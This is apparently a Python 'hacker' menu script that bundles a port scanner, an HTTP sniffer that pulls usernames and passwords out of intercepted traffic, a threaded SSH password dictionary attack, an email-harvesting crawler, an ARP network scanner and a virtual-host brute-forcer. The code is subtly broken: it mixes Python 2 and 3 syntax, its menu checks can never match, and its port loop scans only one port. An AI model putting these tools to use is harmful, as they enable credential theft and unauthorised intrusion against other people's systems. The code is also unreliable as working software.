#!usr/bin/env/python

import socket
import subprocess
import sys
import os
from datetime import datetime
import struct
import textwrap
import scapy.all as scapy
import argparse
from scapy.layers import http
import threading
from threading import Thread
import time
from bs4 import BeautifulSoup
import requests
import requests.exceptions
from urllib.parse import urlsplit
from collections import deque
import re
import argparse
from pexpect import pxssh
import nmap


os.system("clear")
print("Tool started")
print('\n')
os.system("toilet -fmono12 -F gay Insaane Hacker ")
print('\n')

print(" 1. Port Scanning ")
print(" 2. Network Sniffer ")
print(" 3. Password cracking ")
print(" 4. Email/Phone/Banner")
print(" 5. Vunerability Scanner")
print(" 6. Running Service ")

op = input("Choose your desired Option : ")

#First case
if op == 1 :
    # Clear the screen
    subprocess.call('clear', shell=True)

    # Ask for input
    remoteServer    = raw_input("Enter a remote host to scan: ")
    remoteServerIP  = socket.gethostbyname(remoteServer)

    # Print a nice banner with information on which host we are about to scan
    print "-" * 60
    print "Please wait, scanning remote host", remoteServerIP
    print "-" * 60

    # Check what time the scan started
    t1 = datetime.now()

    # Using the range function to specify ports (here it will scans all ports between 1 and 1024)

    # We also put in some error handling for catching errors

    try:
        for port in range(21,22,9200):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                print "Port {}: 	 Open".format(port)
            sock.close()

    except KeyboardInterrupt:
        print "You pressed Ctrl+C"
        sys.exit()

    except socket.gaierror:
        print 'Hostname could not be resolved. Exiting'
        sys.exit()

    except socket.error:
        print "Couldn't connect to server"
        sys.exit()

    # Checking the time again
    t2 = datetime.now()

    # Calculates the difference of time, to see how long it took to run the script
    total =  t2 - t1

    # Printing the information to screen
    print 'Scanning Completed in: ', total
    
#second case
elif op == 2 :
    def get_interface():
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
        arguments = parser.parse_args()
        return arguments.interface

    def sniff(iface):
        scapy.sniff(iface=iface, store=False, prn=process_packet)

    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keys = ["username", "password", "pass", "email"]
                for key in keys:
                    if key in load:
                        print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                        break

    iface = get_interface()
    sniff(iface)

#Third case
elif op == 3 :
    Found = False
    Fails = 0

    maxConnections = 5
    connection_lock = threading.BoundedSemaphore(maxConnections)

    def nmapScan(tgtHost):
            nmapScan = nmap.PortScanner()
            nmapScan.scan(tgtHost, '22')
            state = nmapScan[tgtHost]['tcp'][22]['state']
            return state

    def connect(host, user, password, release):
            global Found
            global Fails
            try:
                    s = pxssh.pxssh()
                    s.login(host, user, password)
                    print('\n===========================================================')
                    print('\n[+] Password Found: {}\n'.format(password.decode('utf-8')))
                    print('===========================================================\n')
                    Found = True
                    s.logout()
            except Exception as e:
                    if 'read_nonblocking' in str(e):
                            Fails += 1
                            time.sleep(5)
                            connect(host, user, password, False)
                    elif 'synchronize with original prompt' in str(e):
                            time.sleep(1)
                            connect(host, user, password, False)
            finally:
                    if release: 
                            connection_lock.release()

    def main():
            parser = argparse.ArgumentParser('SSH Dictionary Based Attack')
            parser.add_argument('host', type=str, help='Host IP address for the SSH server')
            parser.add_argument('user', type=str, help='Username for the SSH connection')
            parser.add_argument('passwordFile', type=str, help='Password file to be used as the dictionary')
            args = parser.parse_args()
            host = args.host
            user = args.user
            passwordFile = args.passwordFile

            global Found
            global Fails

            print('\n========================================')
            print('Welcome to SSH Dictionary Based Attack')
            print('========================================\n')
            
            print('[+] Checking SSH port state on {}'.format(host))
            if nmapScan(host) == 'open':
                    print('[+] SSH port 22 open on {}'.format(host))
            else:
                    print('[!] SSH port 22 closed on {}'.format(host))	
                    print('[+] Exiting Application.\n')
                    exit()

            print('[+] Loading Password File\n')
            
            try:
                    fn = open(passwordFile, 'rb')
            except Exception as e:
                    print(e)
                    exit(1)
            
            for line in fn:
                    if Found:
                            # print('[*] Exiting Password Found')
                            exit(0)
                    elif Fails > 5:
                            print('[!] Exiting: Too Many Socket Timeouts')
                            exit(0)

                    connection_lock.acquire()
                    
                    password = line.strip()
                    print('[-] Testing Password With: {}'.format(password.decode('utf-8')))
                    
                    t = Thread(target=connect, args=(host, user, password, True))
                    t.start()
            
            while (threading.active_count() > 1):
                    if threading.active_count() == 1 and Found != True:
                            print('\n===========================================')
                            print('\nPassword Not Found In Password File.\n')
                            print('===========================================\n')
                            print('[*] Exiting Application')
                            exit(0)
                    elif threading.active_count() == 1 and Found == True:
                            print('[*] Exiting Application.\n')

    if __name__ == '__main__':
            main()

#Fourth case
elif op == 4 :
    # a queue of urls to be crawled
    new_urls = deque(['http://www.themoscowtimes.com/contact_us/index.php'])

    # a set of urls that we have already crawled
    processed_urls = set()

    # a set of crawled emails
    emails = set()

    # process urls one by one until we exhaust the queue
    while len(new_urls):

        # move next url from the queue to the set of processed urls
        url = new_urls.popleft()
        processed_urls.add(url)

        # extract base url to resolve relative links
        parts = urlsplit(url)
        base_url = "{0.scheme}://{0.netloc}".format(parts)
        path = url[:url.rfind('/')+1] if '/' in parts.path else url

        # get url's content
        print("Processing %s" % url)
        try:
            response = requests.get(url)
        except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
            # ignore pages with errors
            continue

        # extract all email addresses and add them into the resulting set
        new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
        emails.update(new_emails)

        # create a beutiful soup for the html document
        soup = BeautifulSoup(response.text)

        # find and process all the anchors in the document
        for anchor in soup.find_all("a"):
            # extract link url from the anchor
            link = anchor.attrs["href"] if "href" in anchor.attrs else ''
            # resolve relative links
            if link.startswith('/'):
                link = base_url + link
            elif not link.startswith('http'):
                link = path + link
            # add the new url to the queue if it was not enqueued nor processed yet
            if not link in new_urls and not link in processed_urls:
                new_urls.append(link)

#Fifth case
elif op == 5 :
    def get_arguments():
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target", dest="target", help="Sepcify target ip or ip range")
        options = parser.parse_args()
        return  options

    def scan(ip):
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        client_list = []

        for element in answered_list:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            client_list.append(client_dict)

        return client_list

    def print_result(scan_list):
        print("IP\t\t\tMAC\n----------------------------------------")
        for client in scan_list:
            print(client["ip"] + "\t\t" + client["mac"])

    options = get_arguments()
    result_list = scan(options.target)
    print_result(result_list)

#Sixth case
elif op == 6 :
    def main():
        parser = argparse.ArgumentParser()
        parser.add_argument('--ip', dest='ip', type=str,  required=True)
        parser.add_argument('--host', dest='host', type=str, required=True)
        parser.add_argument('--port', dest='port', type=int, default=80)
        parser.add_argument('--ignore-http-codes', dest='ignore_http_codes', type=str, help='comma separated list of http codes', default='404')
        parser.add_argument('--ignore-content-length', dest='ignore_content_length', type=int, default=0)
        parser.add_argument('--wordlist', dest='wordlist', type=str, help='file location', default='wordlist')
        parser.add_argument('--output', dest='output', type=str, help='output file', default='./output.txt')
        parser.add_argument('--ssl', dest='ssl', action='store_true', help='use SSL')

        args = parser.parse_args()
        
        ignore_http_codes = list(map(int, args.ignore_http_codes.replace(' ', '').split(',')))
        if os.path.exists(args.wordlist):
            virtual_host_list = open(args.wordlist).read().splitlines()
            results = ''
            
            for virtual_host in virtual_host_list:
                hostname = virtual_host.replace('%s', args.host)

                headers = {
                    'Host': hostname if args.port == 80 else '{}:{}'.format(args.host, args.port),
                    'Accept': '*/*'
                }

                dest_url = '{}://{}:{}/'.format('https' if args.ssl else 'http', args.ip, args.port)
                try:
                    res = requests.get(dest_url, headers=headers, verify=False)
                except requests.exceptions.RequestException:
                    continue

                if res.status_code in ignore_http_codes:
                    continue

                if args.ignore_content_length > 0 and args.ignore_content_length == int(res.headers['content-length']):
                    continue
                
                # do it this way to see results in real-time
                output = 'Found: {} ({})'.format(hostname, res.status_code)
                results += output + '\n'
                print(output)
                
                for key, val in res.headers.items():
                    output = '  {}: {}'.format(key, val)
                    results += output + '\n'
                    print(output)

            if not os.path.isdir(args.output):
                print(' Start writing final results')
                with open(args.output, 'a+b') as f:
                    f.write(results)

                print(' Finish writing final results')
        else:
            print('Error: wordlist file "{}" does not exist'.format(args.wordlist))


    if __name__ == '__main__':
        main()


else :
   print(" Enter a valid option... ")
